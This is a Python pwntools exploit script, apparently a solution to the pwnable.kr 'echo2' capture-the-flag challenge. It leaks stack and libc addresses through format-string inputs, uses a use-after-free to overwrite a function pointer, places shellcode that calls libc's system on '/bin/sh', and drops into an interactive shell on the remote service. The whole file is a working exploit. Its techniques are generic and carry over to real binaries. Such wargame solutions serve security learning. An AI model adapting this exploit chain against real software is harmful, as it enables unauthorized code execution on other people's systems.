#!/usr/bin/env python2
from pwn import *
context(arch = 'amd64', os = 'linux')

ready = True
if ready:
    conn = remote('pwnable.kr', 9011)
else:
    conn = process(['/home/doublesine/Desktop/echo2'])

def Sendline(s):
    print(s)
    conn.sendline(s)
    sleep(0.5)

main_addr = 0x0000000000400910
main_stack_size = 0x30
echo3_stack_size = 0x10
sizeof_ebp = 8
sizeof_return_address = 8

print conn.read(),
Sendline('fuckfuck')
print conn.read(),

# choose 2 to leak ebp of main
Sendline('2')
print conn.read(),
Sendline('%10$p')
main_ebp = int(conn.readline().replace('\n', ''), base = 16)
print('[*] main_ebp = 0x%08x' % main_ebp)
print conn.read(),

# choose 2 to leak some functions' address
Sendline('2')
print conn.read(),
Sendline('%19$p')
libc_start_main_offset_240 = int(conn.readline().replace('\n', ''), base = 16)
libc_start_main = libc_start_main_offset_240 - 240
libc_base_addr = libc_start_main - 0x20740
libc_system = libc_base_addr + 0x45390
libc_bin_sh_addr = libc_base_addr + 0x18CD57
print('[*] libc_start_main + 240 = 0x%016x' % libc_start_main_offset_240)
print('[*] libc_start_main = 0x%016x' % libc_start_main)
print('[*] libc_base_addr = 0x%016x' % libc_base_addr)
print('[*] libc_system = 0x%016x' % libc_system)
print('[*] libc_bin_sh_addr = 0x%016x' % libc_bin_sh_addr)
print conn.read(),

# exit and cancel exit to free
Sendline('4')
print conn.read(),
Sendline('n')
print conn.read(),

# goto echo3 to trigger UAF and overwrite func pointer to main
Sendline('3')
print conn.read(),
# send payload
Sendline('fuckfuckfuckfuckfuckfuck' + pack(main_addr, 64))
print conn.read(),

# send shellcode to stack
shellcode = asm('mov rdi, 0x%016x' % libc_bin_sh_addr)
shellcode += asm('mov rax, 0x%016x' % libc_system)
shellcode += asm('call rax')
assert(len(shellcode) < 24)
Sendline(shellcode)
shellcode_addr = main_ebp - main_stack_size - \
                 sizeof_return_address - sizeof_ebp - echo3_stack_size - \
                 sizeof_return_address - sizeof_ebp - 0x20
print('[*] shellcode_addr = 0x%016x' % shellcode_addr)

# exit and cancel exit to free
Sendline('4')
print conn.read(),
Sendline('n')
print conn.read(),

# goto echo3 to trigger UAF and overwrite func pointer to shellcode_addr
Sendline('3')
print conn.read(),
# send payload
Sendline('fuckfuckfuckfuckfuckfuck' + pack(shellcode_addr, 64))
print conn.read(),

# you will get shell here
conn.interactive()
conn.close()
